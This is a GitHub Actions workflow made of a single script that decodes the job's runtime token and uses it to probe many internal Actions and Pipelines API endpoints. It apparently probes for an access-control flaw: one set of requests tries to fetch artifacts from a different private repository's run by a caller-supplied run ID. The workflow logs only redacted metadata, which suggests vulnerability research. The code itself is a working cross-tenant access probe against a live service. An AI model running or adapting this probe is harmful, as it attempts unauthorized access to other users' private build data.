name: runtime-context-safe
on:
  workflow_dispatch:
permissions:
  contents: read
jobs:
  context:
    runs-on: ubuntu-latest
    steps:
      - name: Capture safe runtime scope and service routes
        uses: actions/github-script@f28e40c7f34bde8b3046d885e986cb6290c5673b
        with:
          script: |
            const token = process.env.ACTIONS_RUNTIME_TOKEN
            const runtime = process.env.ACTIONS_RUNTIME_URL
            const results = process.env.ACTIONS_RESULTS_URL
            if (!token || !runtime) throw new Error(`runtime instrument absent token=${!!token} url=${!!runtime}`)
            const dec = s => JSON.parse(Buffer.from(s.split('.')[1], 'base64url').toString('utf8'))
            const claims = dec(token)
            const safeUrl = u => { const x = new URL(u); return {host:x.hostname, path:x.pathname} }
            core.info('RUNTIME_SAFE=' + JSON.stringify({
              runtime:safeUrl(runtime), results:results ? safeUrl(results) : null,
              claims:Object.fromEntries(['scp','repository_id','owner_id','plan_id','orch_id','job_id','run_id','runner_id','aud','iss'].map(k => [k,claims[k] ?? null]))
            }))
            const env = {}
            for (const [k,v] of Object.entries(process.env)) {
              if (/(PLAN|TIMELINE|PROJECT|SCOPE|JOBID|JOB_ID|COLLECTION|ORCHESTRATION)/i.test(k) && /^[A-Za-z0-9_:\/.@-]{0,300}$/.test(v || '')) env[k]=v
            }
            core.info('RUNTIME_ENV_SAFE=' + JSON.stringify(env))

            const url = new URL('_apis/connectionData?connectOptions=1&lastChangeId=-1&lastChangeId64=-1', runtime)
            const res = await fetch(url, {headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
            const text = await res.text()
            let body = {}; try { body = JSON.parse(text) } catch {}
            const wanted = new Set(['83597576-cc2c-453c-bea6-2882ae6a1653','fc825784-c92a-4299-9221-998a02d1b54f','27d7f831-88c1-4719-8ca1-6a061dad90eb'])
            const defs = (body.locationServiceData?.serviceDefinitions || body.serviceDefinitions || [])
              .filter(x => wanted.has(String(x.identifier || '').toLowerCase()))
              .map(x => ({identifier:x.identifier,displayName:x.displayName,relativePath:x.relativePath,serviceType:x.serviceType}))
            core.info('CONNECTION_SAFE=' + JSON.stringify({status:res.status,bytes:text.length,authenticatedUserId:body.authenticatedUser?.id || null,instanceId:body.instanceId || null,defs}))

            const zero = '00000000-0000-0000-0000-000000000000'
            const candidates = {
              plan: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}?api-version=6.0-preview.1`,
              timelines: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}/timelines?api-version=6.0-preview.1`,
              timeline: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}/timelines/${claims.plan_id}?includeRecords=true&api-version=6.0-preview.1`,
              records: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}/timelines/${claims.plan_id}/records?api-version=6.0-preview.1`,
              logs: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}/logs?api-version=6.0-preview.1`,
              attachments: `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.plan_id}/attachments?api-version=6.0-preview.1`
            }
            candidates.lower_plan = `${zero}/_apis/distributedtask/hubs/actions/plans/${claims.plan_id}?api-version=6.0-preview.1`
            candidates.lower_timeline = `${zero}/_apis/distributedtask/hubs/actions/plans/${claims.plan_id}/timelines/${claims.plan_id}?includeRecords=true&api-version=6.0-preview.1`
            candidates.lower_records = `${zero}/_apis/distributedtask/hubs/actions/plans/${claims.plan_id}/timelines/${claims.plan_id}/records?api-version=6.0-preview.1`
            candidates.lower_logs = `${zero}/_apis/distributedtask/hubs/actions/plans/${claims.plan_id}/logs?api-version=6.0-preview.1`
            for (const [label,path] of Object.entries(candidates)) {
              const r = await fetch(new URL(path, runtime), {headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
              const t = await r.text(); let j = {}; try { j=JSON.parse(t) } catch {}
              const value = Array.isArray(j.value) ? j.value : Array.isArray(j.records) ? j.records : []
              core.info('PIPELINE_SAFE=' + JSON.stringify({label,status:r.status,bytes:t.length,message:j.message || j.msg || null,id:j.id || null,recordCount:value.length,recordNames:value.slice(0,5).map(x=>x.name || x.type || null)}))
            }
            if (claims.orch_id && claims.orch_id !== claims.plan_id) {
              for (const [label,suffix] of Object.entries({
                orch_plan:'',
                orch_timelines:'/timelines',
                orch_logs:'/logs',
                orch_timeline_self:`/timelines/${claims.orch_id}`,
                orch_records_self:`/timelines/${claims.orch_id}/records`
              })) {
                const path = `${zero}/_apis/distributedtask/hubs/Actions/plans/${claims.orch_id}${suffix}?includeRecords=true&api-version=6.0-preview.1`
                const r = await fetch(new URL(path,runtime), {headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
                const t=await r.text(); let j={}; try{j=JSON.parse(t)}catch{}
                const value=Array.isArray(j.value)?j.value:Array.isArray(j.records)?j.records:[]
                core.info('PIPELINE_SAFE='+JSON.stringify({label,status:r.status,bytes:t.length,message:j.message||j.msg||null,id:j.id||null,recordCount:value.length,recordNames:value.slice(0,5).map(x=>x.name||x.type||null)}))
              }
            }
            if (env.ACTIONS_ORCHESTRATION_ID && /^[0-9a-f-]{36}$/i.test(env.ACTIONS_ORCHESTRATION_ID)) {
              const p=env.ACTIONS_ORCHESTRATION_ID
              for (const [label,suffix] of Object.entries({env_plan:'',env_timelines:'/timelines',env_logs:'/logs',env_timeline_self:`/timelines/${p}`,env_records_self:`/timelines/${p}/records`})) {
                const path=`${zero}/_apis/distributedtask/hubs/Actions/plans/${p}${suffix}?includeRecords=true&api-version=6.0-preview.1`
                const r=await fetch(new URL(path,runtime),{headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
                const t=await r.text();let j={};try{j=JSON.parse(t)}catch{};const value=Array.isArray(j.value)?j.value:Array.isArray(j.records)?j.records:[]
                core.info('PIPELINE_SAFE='+JSON.stringify({label,status:r.status,bytes:t.length,message:j.message||j.msg||null,id:j.id||null,recordCount:value.length,recordNames:value.slice(0,5).map(x=>x.name||x.type||null)}))
              }
            }

            // Actions.GenericRead is consumed by the Pipelines service, not the DistributedTask
            // timeline routes above. Exercise every read-shaped location exposed by ConnectionData.
            const pipeReads = {
              plan_logs:`_apis/pipelines/plans/${encodeURIComponent(claims.orch_id)}/logs?api-version=6.0-preview.1`,
              plan_artifacts:`_apis/pipelines/plans/${encodeURIComponent(claims.orch_id)}/artifacts?api-version=6.0-preview.1`,
              summary:`_apis/pipelines/plans/${claims.plan_id}/summary?api-version=6.0-preview.1`,
              signed_summary:`_apis/pipelines/plans/${claims.plan_id}/signedsummary?api-version=6.0-preview.1`,
              job:`_apis/pipelines/plans/${claims.plan_id}/jobs/${claims.job_id}?api-version=6.0-preview.1`,
              steps:`_apis/pipelines/plans/${claims.plan_id}/jobs/${claims.job_id}/steps?api-version=6.0-preview.1`
            }
            for (const [label,path] of Object.entries(pipeReads)) {
              const r=await fetch(new URL(path,runtime),{headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
              const t=await r.text();let j={};try{j=JSON.parse(t)}catch{};const value=Array.isArray(j.value)?j.value:Array.isArray(j.records)?j.records:Array.isArray(j.logs)?j.logs:[]
              core.info('GENERICREAD_SAFE='+JSON.stringify({label,status:r.status,bytes:t.length,message:j.message||j.msg||null,id:j.id||null,count:value.length,names:value.slice(0,5).map(x=>x.name||x.type||x.id||null)}))
            }

            // Legacy Actions Storage/Pipelines API: definition id is a dummy 1 and GitHub run id
            // is caller-supplied. This is distinct from the v4 Results-service backend GUID check.
            const legacyReads = {
              same_repo:`${zero}/_apis/pipelines/1/runs/33045645344/artifacts?artifactName=${encodeURIComponent('secret-33045645344')}&api-version=6.0-preview.1`,
              other_private_repo:`${zero}/_apis/pipelines/1/runs/30727101970/artifacts?artifactName=privart&api-version=6.0-preview.1`,
              garbage_run:`${zero}/_apis/pipelines/1/runs/99999999999/artifacts?artifactName=privart&api-version=6.0-preview.1`
            }
            for (const [label,path] of Object.entries(legacyReads)) {
              const r=await fetch(new URL(path,runtime),{headers:{authorization:`Bearer ${token}`,accept:'application/json'}})
              const t=await r.text();let j={};try{j=JSON.parse(t)}catch{}
              const a=j.value?.[0] || j
              core.info('LEGACY_ARTIFACT_SAFE='+JSON.stringify({label,status:r.status,bytes:t.length,message:j.message||j.msg||null,name:a.name||null,containerId:a.resource?.data||a.containerId||null,resourceType:a.resource?.type||null,downloadUrlPresent:!!(a.resource?.downloadUrl||a.downloadUrl)}))
            }
